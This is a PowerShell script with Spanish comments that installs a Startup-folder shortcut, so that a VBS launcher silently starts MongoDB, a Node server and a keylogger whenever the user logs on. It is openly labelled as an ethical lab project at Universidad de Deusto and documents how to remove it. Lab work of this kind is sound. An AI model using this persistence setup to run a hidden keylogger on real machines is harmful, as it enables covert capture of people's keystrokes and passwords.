# install-autostart.ps1
# Crea un acceso directo en la carpeta de Inicio del usuario actual
# para que iniciar.vbs arranque al iniciar sesion en Windows.
# Esto lanza MongoDB + servidor Node + keylogger, todo oculto.
#
# Metodo: shortcut en %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
#   - Es el metodo documentado por Microsoft.
#   - Aparece listado en Administrador de tareas > Inicio.
#   - Se desinstala borrando el shortcut (ver uninstall-autostart.ps1).
#   - No requiere permisos de administrador.
#
# Uso:
#   powershell -ExecutionPolicy Bypass -File .\install-autostart.ps1 [-VbsPath "C:\ruta\iniciar.vbs"]

param(
    [string]$VbsPath = "",
    [string]$ShortcutName = "KeyloggerLab.lnk"
)

$ErrorActionPreference = "Stop"

function Resolve-VbsPath {
    param([string]$given)
    if ($given -and (Test-Path $given)) {
        return (Resolve-Path $given).Path
    }
    $here = Split-Path -Parent $MyInvocation.MyCommand.Path
    $candidates = @(
        (Join-Path $here "iniciar.vbs"),
        (Join-Path (Split-Path $here -Parent) "iniciar.vbs"),
        (Join-Path (Split-Path (Split-Path $here -Parent) -Parent) "iniciar.vbs")
    )
    foreach ($c in $candidates) {
        if (Test-Path $c) { return (Resolve-Path $c).Path }
    }
    throw "No se encontro iniciar.vbs. Pasalo con -VbsPath 'C:\ruta\iniciar.vbs'."
}

$vbs = Resolve-VbsPath $VbsPath
$startup = [Environment]::GetFolderPath("Startup")
if (-not (Test-Path $startup)) {
    throw "No existe la carpeta de inicio: $startup"
}
$shortcutPath = Join-Path $startup $ShortcutName

$shell = New-Object -ComObject WScript.Shell
$sc = $shell.CreateShortcut($shortcutPath)
$sc.TargetPath       = "wscript.exe"
$sc.Arguments        = "`"$vbs`""
$sc.WorkingDirectory = Split-Path -Parent $vbs
$sc.Description      = "Keylogger (laboratorio etico - Universidad de Deusto)"
$sc.WindowStyle      = 7   # 7 = minimizado, sin activar
$sc.Save()

Write-Host "Autostart instalado:"
Write-Host "  Shortcut:    $shortcutPath"
Write-Host "  Ejecuta:     wscript.exe `"$vbs`""
Write-Host ""
Write-Host "Al iniciar sesion se arrancara: MongoDB + servidor + keylogger (todo oculto)."
Write-Host ""
Write-Host "Comprobaciones:"
Write-Host "  - Administrador de tareas > Inicio: deberia aparecer '$ShortcutName'"
Write-Host "  - Para desinstalar: ejecuta uninstall-autostart.ps1 o borra el shortcut."
